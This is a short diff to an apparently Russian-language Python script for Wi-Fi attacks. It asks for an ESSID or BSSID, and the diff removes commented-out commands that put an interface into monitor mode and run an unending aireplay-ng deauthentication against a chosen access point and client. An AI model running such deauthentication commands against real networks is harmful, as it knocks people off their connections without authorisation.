@@ -25,11 +25,3 @@ while True:
         break
     else:
         ssid_type = input('Вы ввели что то нето пожалуйста введите снова\nESSID или BSSID ~ ')
-
-# os.system("sudo airmon-ng start " + interface)
-# os.system("sudo timeout -k 20 15s airodump-ng --bssid "+AP_mac+" "+interface+" < /dev/null")
-# client_mac=input("Client Mac ~ ")
-# os.system("sudo airmon-ng start "+interface+""+channel)
-# os.system("sudo aireplay-ng --deauth 0 -a "+AP_mac+" -c "+client_mac+" "+interface+" --ignore-negative-one -D")
-
-# os.system("sudo airmon-ng stop" + interface)  # Возвращение сети
